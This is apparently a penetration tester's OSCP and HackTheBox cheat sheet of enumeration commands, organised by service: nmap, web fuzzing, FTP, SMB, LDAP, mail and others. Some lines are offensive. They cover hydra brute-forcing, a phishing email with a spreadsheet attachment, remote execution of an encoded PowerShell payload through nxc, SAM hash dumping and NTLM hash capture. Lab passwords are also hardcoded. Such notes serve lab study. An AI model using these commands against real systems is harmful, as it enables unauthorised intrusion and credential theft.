---
description: All but the easiest HTBs are harder than even the 25 point exam boxes.
---

# Enumeration

{% embed url="https://sgtdede.gitbook.io/hacking/oscp-2022/guide-en" %}

{% embed url="https://eins.li/posts/oscp-secret-sauce/" %}

{% embed url="https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html" %}

{% embed url="https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance" %}

{% embed url="https://github.com/oncybersec/oscp-enumeration-cheat-sheet" %}

### Nmap

```
sudo nmap -v $ip -sC -sV -p- --open -oN tcpscan.nmap (TCP)
sudo nmap -sVC -vvv $ip --script vuln -oN fulltcpscan.nmap (Scan vulnerabilities eg. SMB)

sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv $ip  (UDP)
-Pn Disables host discovery and only conducts a port scan. 
-A OS/Version Detection
-O Remote OS detection using TCP/IP stack fingerprinting
```

> I start nearly every box this way because it quickly returns a wealth of information. Sudo as it defaults to the faster half-open SYN scan, then -Pn to ignore ping and assume it is up, -n to ignore DNS, the IP address, -sC for default scripts, -sV for version information, -p- to scan all ports, and MOST importantly the — open argument to only apply scripts and version scans to found open ports.

### HTTP/HTTPS (80/443)

{% hint style="info" %}
Always look up documentation of service you're trying to exploit, 90% of the time the answer will be there if you feel all other vectors are off
{% endhint %}

<pre data-title="Fuzzing with ffuf"><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -H 'Host: FUZZ.board.htb' -f(c/s/w)   
(Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
(File fuzzing) -e .php,.html,.txt            
(HTTP POST) ffuf -w [wordlist] -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
(Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
(Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200
-p "1.0" and -rate [25]  to rate limit incase of WAF
-r follow redirect
-recursion
wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"

nikto -h $ip
</code></pre>

#### Send web request via cURL

```
curl --insecure -u [username:password] -b "[cookiename]=[value]" -X POST --data "[data]" [URL] (--insecure bypass SSL verification)
```

#### WordPress

```
sudo wpscan --url http://[URL]
sudo wpscan --url http://[URL] -e ap --plugins-detection aggressive
```

#### WebDAV

{% embed url="https://www.linkedin.com/pulse/exploiting-webdav-gainrce-arav-budhiraja/" %}
cadaver go crazy (ASP revshell)
{% endembed %}

### FTP (21)

* Version number and associated CVEs
* Anonymous / authenticated login (with discovered creds)
* Sensitive files that you have read access to
* File upload

```
wget -r ftp://anonymous:@<IP>    [If you can't see anything or don't really know where you are]
ftp [ip]
passive (Mitigate entering passive mode)
dir
dir
binary (Set to binary mode for proper channel to download bin files)
get [file]
```

Brute Force

`sudo hydra -L names.txt -P '/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt' -s 21 ftp://$IP`

### SSH (22)

```
ssh -L [kali_port]:localhost:[target_port] [user]@[ip] -fN
chmod 600 id_dsa
port forwarding (local and remote)
sshuttle
proxychains?
```

### SMTP (25) and Mail

```
telnet 10.10.11.14 25
EHLO [emailid]
AUTH LOGIN
[username in base64]
[password in base64]
```

User Enumeration via SMTP

```
smtp-user-enum -M VRFY -U [userlist] -t [ip] 
```

Send Mail \[Phishing]

```
sudo swaks --to mailadmin@localhost --from jonas@localhost --header 'Subject: Please check this spreadsheet' --header-X-Test "Header" --server 192.168.171.140  --attach @yess.ods
```

#### IMAP (143)

{% hint style="info" %}
Hepet \[WIndows PG]
{% endhint %}

```
telnet $ip 143
A1 login jonas SicMundusCreatusEst
A1 list "INBOX/" "*"
g21 SELECT "INBOX"

F1 fetch 5 RFC822 [5 mails that's why]
```

#### POP3 (110)

Brute force

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

Read mail

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

### DNS (53)

```
dig axfr hutch.offsec @192.168.223.122
```

### SMB & RPC (139/445)

```
NXC
nxc smb [ip]
nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
nxc smb [host/ip] -u guest -p '' --shares [list shares depending on user access provided]
nxc smb [host] -u [user] -p [password] --sam
nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='

SMBCLIENT [INTERACT WITH SMB]
smbclient //[ip]/[share] -N -L [List share with null auth]
smbclient --user username //10.10.11.35/DEV
recurse ON
prompt OFF
mget *
smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass [Kerberos auth]

SMBMAP
smbmap -H [ip] -u user -p 'password' -r SYSVOL --depth 10
smbmap -H [ip] --download PATH_TO_FILE

RPCCLIENT
rpcclient -U '' -N 10.10.11.35   
rpcclient -U 'user'  10.10.11.35
enumdomusers
enumdomgroups
querydispinfo (less info about all users)
querygroup [RID]
queryuser [RID]
enumprivs

MOUNT
#First create folder in kali linux 
mkdir /mnt/smb
#mount folder to kali
sudo mount -t cifs //[IP]/[SHARE] /mnt/smb

responder to receive NTLM authentication hashes from services like mysql
smbserver.py
```

#### User Enumeration

<pre><code><strong>lookupsid.py guest@[ip] -no-pass
</strong>lookupsid.py [domain]/[user]:'[pass]'@[ip/domain]
netexec smb [ip] -u guest -p '' --[rid-brute/users/groups/local-users]
</code></pre>

{% embed url="https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html" %}

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}

### LDAP (389)&#x20;

Good place to find user creds - check user description along with rpcclient

```
ldapsearch -H ldap://[ip] -x -s base namingcontexts  [-x simple auth, -s scope]
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" > ldap.anon.out  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)'

Windows timestamp to human cus Windows does not follow EPOC, for user and password creation and last pass attempt and all the stuff associated with the above search
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  sAMAccountType

ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType | grep sAMAccountName | awk '{print $2}' > userlist.ldap

ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "User" -B 20 -A 20
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(&(objectClass=Person)(cn=support))'| grep "User" -A 20 -B 20

nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}

{% embed url="https://web.archive.org/web/20200309204648/http://0daysecurity.com/penetration-testing/enumeration.html" %}

[^1]: FUZZ=key if you wanna do the opposite
